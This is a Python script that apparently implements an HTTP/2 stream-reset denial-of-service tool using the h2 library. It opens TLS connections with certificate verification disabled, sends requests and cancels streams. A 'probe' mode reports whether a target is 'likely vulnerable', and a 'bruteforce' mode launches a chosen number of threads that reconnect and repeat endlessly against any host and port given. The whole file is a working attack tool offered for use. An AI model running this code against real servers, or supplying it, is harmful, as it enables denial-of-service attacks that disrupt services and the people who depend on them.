import argparse
import sys
import threading
import socket
from h2.connection import H2Connection
from h2.events import RequestReceived, StreamReset
from h2.config import H2Configuration
import ssl
from h2.errors import ErrorCodes

def root_function():
    while True:
        try:
            invoke()
        except Exception as e:
            print(f"An error occurred: {e}")


def invoke():
    # Create a TCP connection
    sock = socket.create_connection((args.url, args.port))
    # Wrap the socket for TLS
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    ctx.set_alpn_protocols(['h2'])
    sock = ctx.wrap_socket(sock, server_hostname=args.url)
    # Make sure we're using HTTP/2
    assert sock.selected_alpn_protocol() == 'h2'
    # Create HTTP/2 connection
    config = H2Configuration(client_side=True)
    conn = H2Connection(config=config)
    conn.initiate_connection()
    sock.sendall(conn.data_to_send())
    # Create a new stream
    stream_id = conn.get_next_available_stream_id()
    conn.send_headers(
        stream_id,
        [(':method', 'GET'), (':authority', args.url), (':path', '/'), (':scheme', 'https')],
    )
    sock.sendall(conn.data_to_send())
    # Read some data
    while True:
        data = sock.recv(65535)
        if not data:
            break

        events = conn.receive_data(data)
        for event in events:
            if isinstance(event, RequestReceived):
                # Cancel the stream with error code for CANCEL
                conn.reset_stream(event.stream_id, error_code=ErrorCodes.CANCEL)
                if (args.mode == "probe"):
                    sys.exit(1)
            elif isinstance(event, StreamReset):
                print(f"Stream {event.stream_id} cancelled.")
                if (args.mode == "probe"):
                    print(f"Likely vulnerable.")
                    sys.exit(0)

        sock.sendall(conn.data_to_send())


parser = argparse.ArgumentParser()

parser.add_argument("-u", "--url", help="Target URL")
parser.add_argument("-p", "--port", help="Target Port")
parser.add_argument("-t", "--threads", help="Number of threads", type=int)
parser.add_argument("-m", "--mode", help="Type of test, probe or bruteforce")

args = parser.parse_args()

if (args.mode == "bruteforce"):

    threads = []
    for i in range(args.threads):
        thread = threading.Thread(target=root_function)
        thread.start()
        threads.append(thread)
    print("Threads started")

    # Keep the main threads alive
    for thread in threads:
        thread.join(timeout=99999)

if (args.mode == "probe"):
    invoke()
